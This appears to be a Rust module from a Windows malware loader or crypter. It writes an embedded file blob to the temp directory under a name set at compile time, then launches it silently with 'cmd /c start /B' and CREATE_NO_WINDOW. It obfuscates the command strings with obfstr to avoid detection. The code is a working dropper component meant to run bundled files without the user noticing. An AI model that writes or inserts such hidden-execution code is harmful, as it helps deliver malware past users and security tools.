use std::io::Write;
use std::os::windows::process::CommandExt;
use tempfile::NamedTempFile;
use obfstr::obfstr;

// Include the generated bundle data
include!("bundle_data.rs");

#[allow(dead_code)]
pub fn bundlefile() -> Result<(), Box<dyn std::error::Error>> {
    const CREATE_NO_WINDOW: u32 = 0x08000000;

    // Use compile-time environment variable for filename
    const ORIGINAL_FILE_NAME: &str = env!("RSL_BUNDLE_FILENAME");
    if ORIGINAL_FILE_NAME.is_empty() {
        return Err("Bundle filename not set".into());
    }
    let original_file_name = ORIGINAL_FILE_NAME;
    
    let mut temp_file = NamedTempFile::new().map_err(|e| format!("Failed to create temp file: {}", e))?;
    
    let temp_dir = temp_file.path().parent().unwrap();
    let temp_file_path = temp_dir.join(&original_file_name);

    temp_file.write_all(MEMORY_FILE).map_err(|e| format!("Failed to write to temp file: {}", e))?;
    temp_file.flush().map_err(|e| format!("Failed to flush temp file: {}", e))?;

    std::fs::rename(temp_file.path(), &temp_file_path).map_err(|e| format!("Failed to rename temporary file: {}", e))?;

    use std::process::Command;
    Command::new(obfstr!("cmd"))
        .args(&[obfstr!("/c"), obfstr!("start"), obfstr!("/B"), temp_file_path.to_str().unwrap()])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()
        .map_err(|e| format!("Failed to open file: {}", e))?;

    Ok(())
}